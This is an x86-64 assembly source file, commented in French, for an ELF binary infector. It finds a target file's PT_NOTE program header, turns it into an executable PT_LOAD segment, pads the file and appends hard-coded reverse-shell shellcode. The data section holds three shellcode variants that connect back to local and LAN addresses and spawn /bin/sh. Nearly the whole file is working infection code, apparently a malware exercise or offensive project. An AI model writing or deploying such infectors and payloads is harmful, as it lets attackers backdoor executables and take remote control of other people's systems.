section .data
    msg_error db "Erreur !", 0xa
    msg_error_len equ $ - msg_error



    tp_load db 0x01
    offset_exagereted db 0x00,0x00 ,0x0c,0x00
    droit_write_exe db 0x05

    vaddr_exagereted db 0x00,0x00 ,0x4c,0x00
    paddr_exagereted db 0x00,0x00 ,0x4c,0x00

    taille_exagereted db 0x00 ,0x0c ,0x0c,0x00




    ;reverse_shell db 0x6a,0x0a,0x5e,0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0xb0,0x66,0x89,0xe1,0xcd,0x80,0x97,0x5b,0x68,0x7f,0x00,0x00,0x01,0x68,0x02,0x00,0x04,0xd2,0x89,0xe1,0x6a,0x66,0x58,0x50,0x51,0x57,0x89,0xe1,0x43,0xcd,0x80,0x85,0xc0,0x79,0x19,0x4e,0x74,0x3d,0x68,0xa2,0x00,0x00,0x00,0x58,0x6a,0x00,0x6a,0x05,0x89,0xe3,0x31,0xc9,0xcd,0x80,0x85,0xc0,0x79,0xbd,0xeb,0x27,0xb2,0x07,0xb9,0x00,0x10,0x00,0x00,0x89,0xe3,0xc1,0xeb,0x0c,0xc1,0xe3,0x0c,0xb0,0x7d,0xcd,0x80,0x85,0xc0,0x78,0x10,0x5b,0x89,0xe1,0x99,0xb2,0x6a,0xb0,0x03,0xcd,0x80,0x85,0xc0,0x78,0x02,0xff,0xe1,0xb8,0x01,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x00,0xcd,0x80

    ;reverse_shell db 0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xd6,0x4d,0x31,0xc9,0x6a,0x22,0x41,0x5a,0x6a,0x07,0x5a,0x0f,0x05,0x48,0x85,0xc0,0x78,0x51,0x6a,0x0a,0x41,0x59,0x50,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x85,0xc0,0x78,0x3b,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x01,0x29,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x59,0x48,0x85,0xc0,0x79,0x25,0x49,0xff,0xc9,0x74,0x18,0x57,0x6a,0x23,0x58,0x6a,0x00,0x6a,0x05,0x48,0x89,0xe7,0x48,0x31,0xf6,0x0f,0x05,0x59,0x59,0x5f,0x48,0x85,0xc0,0x79,0xc7,0x6a,0x3c,0x58,0x6a,0x01,0x5f,0x0f,0x05,0x5e,0x6a,0x7e,0x5a,0x0f,0x05,0x48,0x85,0xc0,0x78,0xed,0xff,0xe6

    reverse_shell db 0x31,0xc0,0x50,0x50,0xb0,0x17,0x50,0xcd,0x80,0x50,0x6a,0x01,0x6a,0x02,0xb0,0x61,0x50,0xcd,0x80,0x89,0xc2,0x68,0x7f,0x00,0x00,0x01,0x68,0x00,0x02,0x1f,0x40,0x89,0xe0,0x6a,0x10,0x50,0x52,0x31,0xc0,0xb0,0x62,0x50,0xcd,0x80,0xb1,0x03,0x31,0xdb,0x53,0x52,0xb0,0x5a,0x50,0xcd,0x80,0x43,0xe2,0xf6,0x31,0xc0,0x50,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x53,0x50,0x54,0x53,0xb0,0x3b,0x50,0xcd,0x80,0x31,0xc0,0x50,0x50,0xcd,0x80


    nonope db 0x90


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1


section .text
    global _start

_start:


    pop rax
    cmp rax, 2 ;; nb d'elem
    jne error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            

    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, buffer       ; affichage du fic debug  
    syscall 



    ;init
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



mov r15, buffer


;a rendre dynamique plus tard
parse_phdr:
  xor rcx, rcx                       ; zero out rcx
  xor rdx, rdx                       ; zero out rdx
  mov cx, 12     ;  phnum
  mov rbx, 64    ; rbx contains the offset of the PHT
  mov dx,  56 ; rdx contains the size of an entry in the PHT

  loop_phdr:
    add rbx, rdx                   ; for every iteration, add size of a PHT entry
    dec rcx                        ; decrease phnum until we've iterated through 
    xor r13, r13      
    mov r13d , dword [r15 +rbx] ; all program headers or found a PT_NOTE segment
    cmp dword [r15 +rbx], 0x4  ; if 4, we have found a PT_NOTE segment, ; and head off to infect it
    je pt_note_found
    cmp rcx, 0
    jg loop_phdr


    jmp error 
  pt_note_found:

    mov [offset_tp], rbx

;    mov [offset_tp], rcx
    
    xor rcx,rcx

    xor rax, rax



; =============== PT NOte to PT LOAD =================
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]     ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, tp_load   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   

    
; =============== Changement droit  =================
xor rax, rax
 ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 4   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, droit_write_exe   ; Nouvelles données à écrire
    mov rdx, 1 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Address offset  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    mov r10, 0          ; le déplacement à partir de l'offset spécifié
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, offset_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Virtual address  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 16   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, vaddr_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== physical address  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 24   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, paddr_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Taille to exe  =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 32   ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



; =============== Taille to exe 2 =================
    xor rax, rax

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, [offset_tp]  
    add rsi , 40  ; offset
    mov rdx, 0          ; déplacement à partir du début du fichier
    syscall       

    xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, taille_exagereted   ; Nouvelles données à écrire
    mov rdx, 3 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   







; =============== Aggrandir le fichier  =================
    xor r9, r9
    size_up:

    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0 
    mov rdx, 2         ; déplacement à partir du début du fichier
    syscall  

    
    mov rax, 1                   ; syscall number for write()
    mov rdi, qword [file_descriptor] ; file descriptor
    mov rsi, nonope     ; pointeur vers les données supplémentaires
    mov rdx, 1 ; taille des données supplémentaires
    syscall                      ; appel système pour écrire les données dans le fichier

    inc r9
    cmp r9, 0xc000
    jg end_size_up

    jmp size_up
    end_size_up:



; =============== Ajout shell code  =================


    ; Déplacer le curseur à l'offset spécifié
    mov rax, 8          ; syscall number for lseek
    mov rdi, [file_descriptor]; descripteur de fichier
    mov rsi, 0 
    mov rdx, 2         ; déplacement à partir du début du fichier
    syscall  


     xor rax, rax

    mov rax, 1         
    mov rdi, 3       ; Descripteur de fichier
    mov rsi, reverse_shell   ; Nouvelles données à écrire
    mov rdx, 356 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   



sortie:



        ;fermeture du fichier
    mov rax, 3          
    mov rdi, [file_descriptor]       
    syscall  



    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     


error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall
